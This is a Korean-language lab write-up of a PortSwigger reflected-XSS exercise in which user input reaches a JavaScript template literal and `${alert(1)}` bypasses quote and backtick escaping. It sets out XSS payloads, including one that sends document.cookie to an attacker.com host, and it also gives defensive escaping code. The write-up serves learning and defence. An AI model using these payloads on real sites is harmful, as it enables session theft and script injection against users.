# Lab: Reflected XSS into a JavaScript template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

## 개요

- **난이도**: Practitioner
- **주제**: Cross-Site Scripting (XSS) — Reflected / JS 템플릿 리터럴 / `${}` 표현식 인젝션
- **링크**: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped

## 목표

사용자 입력이 JS 템플릿 리터럴(백틱 문자열) 안에 반영되는 상황에서, 모든 따옴표·백틱·역슬래시가 이스케이프되어 있음에도 `${}` 표현식 구문으로 `alert()` 를 실행시킨다.

## 취약점 분석

### 서버의 이스케이프 처리

```
입력: <   → 출력: &lt;    (HTML 인코딩)
입력: >   → 출력: &gt;    (HTML 인코딩)
입력: '   → 출력: \'     (이스케이프)
입력: "   → 출력: \"     (이스케이프)
입력: \   → 출력: \\     (이스케이프)
입력: `   → 출력: \`     (이스케이프)
입력: $   → 출력: $      (처리 없음 ← 허점)
입력: {   → 출력: {      (처리 없음 ← 허점)
입력: }   → 출력: }      (처리 없음 ← 허점)
```

모든 따옴표와 백틱, 역슬래시를 막았지만 `$`, `{`, `}` 는 이스케이프 대상이 아니다.

### 입력이 반영되는 위치

```javascript
// 서버가 생성하는 JS 코드
var message = `0 search results for 'USER_INPUT'`;
```

## JS 템플릿 리터럴(Template Literal) 이해

ES6(ES2015)에서 도입된 백틱(`` ` ``) 문자열로, 두 가지 핵심 기능을 제공한다.

### 1. 멀티라인 문자열

```javascript
// 일반 문자열 — 줄바꿈 불가
var str = "line1\nline2";

// 템플릿 리터럴 — 줄바꿈 직접 포함 가능
var str = `line1
line2`;
```

### 2. 표현식 보간 (Expression Interpolation) — `${}`

```javascript
var name = "Alice";
var age = 30;

// 일반 문자열
var msg = "이름: " + name + ", 나이: " + age;

// 템플릿 리터럴
var msg = `이름: ${name}, 나이: ${age}`;

// ${} 안에는 임의의 JS 표현식이 들어갈 수 있다
var result = `합계: ${1 + 2}`;          // "합계: 3"
var upper  = `대문자: ${name.toUpperCase()}`;  // "대문자: ALICE"
var exec   = `${alert(1)}`;             // alert(1) 실행 후 "undefined"
```

`${}` 안의 내용은 JS 표현식으로 즉시 평가(eval)된다.

## 공격 방법

### 페이로드

```
${alert(1)}
```

### 생성되는 JS 코드

```javascript
var message = `0 search results for '${alert(1)}'`;
```

### 실행 흐름

```
`0 search results for '${alert(1)}'`
                         ↑
                    표현식 보간 실행
                    alert(1) 호출 → 다이얼로그 표시
                    반환값 undefined → 문자열에 "undefined" 삽입

최종 문자열: "0 search results for 'undefined'"
```

백틱 문자열을 탈출할 필요가 없다. `${}` 가 템플릿 리터럴 내부에서 JS 표현식을 직접 실행시키기 때문이다.

## 이전 랩들과의 비교 — JS 문자열 탈출 방법 총정리

| 랩 | 문자열 유형 | 탈출 방법 | 페이로드 |
|----|-----------|----------|---------|
| 009 | `'` 문자열 (이스케이프 없음) | `'` 직접 삽입 | `'-alert(1)-'` |
| 019 | `'` 문자열 (`'` 이스케이프, `\` 미이스케이프) | `\` 무력화 | `\'-alert(1)-\'` |
| 018 | `'` 문자열 (`'`, `\` 모두 이스케이프) | `</script>` 블록 종료 | `</script><img onerror=alert(1)>` |
| 020 | onclick 속성 `'` 문자열 (모두 이스케이프) | HTML 엔티티 | `&apos;+alert(1)+&apos;` |
| **021** | **`` ` `` 템플릿 리터럴 (모두 이스케이프)** | **`${}` 표현식** | **`${alert(1)}`** |

템플릿 리터럴은 문자열 자체를 탈출하지 않아도 되는 새로운 공격 표면이다.

## 핵심 정리

- JS 템플릿 리터럴은 `` ` `` 로 감싸며, `${}` 안의 표현식을 즉시 실행한다.
- `'`, `"`, `` ` ``, `\` 를 모두 이스케이프해도 `${}` 구문 자체는 막지 못하면 XSS가 가능하다.
- 문자열 탈출 없이 템플릿 리터럴 내부에서 직접 JS를 실행할 수 있다.
- **방어**: 템플릿 리터럴에 삽입되는 값은 `$` 도 이스케이프 대상에 포함시켜야 한다 (`$` → `\$`), 또는 사용자 입력을 템플릿 리터럴에 직접 삽입하지 말고 변수를 분리한다.

## 배운 점 및 추가 학습

### 1. 쉘(Shell)과 JS 템플릿 리터럴의 유사성

사용자가 언급한 것처럼, 쉘의 명령 치환과 구조적으로 유사하다.

```bash
# 쉘 — 백틱으로 명령 실행 (구식)
echo "현재 날짜: `date`"

# 쉘 — $() 로 명령 실행 (현대식)
echo "현재 날짜: $(date)"
```

```javascript
// JS 템플릿 리터럴 — ${} 로 표현식 실행
console.log(`현재 시각: ${new Date()}`);
```

두 경우 모두 ``delimeter`` 또는 `${}` 안의 내용이 "실행"된다는 점이 같다.

### 2. `${}` 안에 사용 가능한 표현식

```javascript
// 함수 호출
`${alert(1)}`
`${confirm('XSS')}`
`${eval('alert(1)')}`

// 즉시 실행 함수 (IIFE)
`${(()=>{ alert(1) })()}`
`${(function(){ alert(1) })()}`

// 메서드 체인
`${document.location='https://attacker.com/?c='+document.cookie}`

// 조건식
`${1 > 0 ? alert(1) : 0}`

// 쉼표 연산자 — 여러 표현식 순서대로 실행
`${(alert(1), alert(2))}`

// 중첩 템플릿 리터럴
`${ `inner` }`

// 빈 객체의 프로퍼티 접근
`${ window['al'+'ert'](1) }`
```

### 3. 태그드 템플릿(Tagged Template)

템플릿 리터럴은 함수와 조합해 "태그드 템플릿"을 만들 수 있다.

```javascript
// 일반 태그드 템플릿
function tag(strings, ...values) {
    console.log(strings); // ['Hello ', '!']
    console.log(values);  // ['World']
    return strings[0] + values[0] + strings[1];
}
var result = tag`Hello ${'World'}!`;

// XSS 관련 — innerHTML 에 태그드 템플릿이 연결된 경우
html`<div>${userInput}</div>`
// html 함수가 escape를 안 하면 innerHTML XSS 가능
```

### 4. 템플릿 리터럴 vs 다른 문자열 유형 — XSS 관점

```javascript
// 단일 따옴표 문자열 — ' 탈출 필요
var a = 'USER_INPUT';
// 공격: '-alert(1)-'

// 이중 따옴표 문자열 — " 탈출 필요
var b = "USER_INPUT";
// 공격: "-alert(1)-"

// 템플릿 리터럴 — 탈출 없이 ${} 로 직접 실행
var c = `USER_INPUT`;
// 공격: ${alert(1)}

// JSON.parse / eval 에 전달되는 문자열
var d = JSON.parse('{"key":"USER_INPUT"}');
// 공격: 구조에 따라 다름 (문자열 종료 후 JSON 구조 탈출)
```

### 5. 방어 코드 예시

```javascript
// 위험 — 사용자 입력을 템플릿 리터럴에 직접 삽입
var msg = `검색 결과: ${userInput}`;   // ${} 가 실행됨

// 위험 — 이스케이프 불완전 ($ 미포함)
var escaped = userInput.replace(/['"\\`]/g, c => '\\' + c);
var msg = `검색 결과: ${escaped}`;     // ${alert(1)} → ${alert(1)} 그대로

// 안전 — $ 도 이스케이프
var escaped = userInput
    .replace(/\\/g, '\\\\')  // \ 먼저
    .replace(/`/g, '\\`')    // 백틱
    .replace(/\$/g, '\\$');  // $ ← 핵심
var msg = `검색 결과: ${escaped}`;
// ${alert(1)} → \${alert(1)} → 표현식으로 해석되지 않음

// 가장 안전 — 템플릿 리터럴에 변수가 아닌 정적 값만 사용
var sanitized = sanitize(userInput);   // 서버에서 완전히 무해하게 처리
document.getElementById('msg').textContent = sanitized;  // DOM API 사용
```

### 6. JS 문자열 유형별 탈출 불가 조건 총정리

```
'단일 따옴표 문자열'
  탈출 불가 조건: ' 와 \ 모두 올바르게 이스케이프
  그러나: <script> 블록 밖(onclick 등) 이면 &apos; 우회 가능 (020 랩)
  그러나: <script> 블록이면 </script> 우회 가능 (018 랩)

"이중 따옴표 문자열"
  탈출 불가 조건: " 와 \ 모두 올바르게 이스케이프
  동일한 우회 경로 존재

`템플릿 리터럴`
  탈출 불가 조건: `, \, $ 모두 올바르게 이스케이프
  $만 빠뜨리면: ${alert(1)} 으로 탈출 없이 바로 실행
  → 탈출(escape) 개념 자체가 필요 없는 공격 경로
```
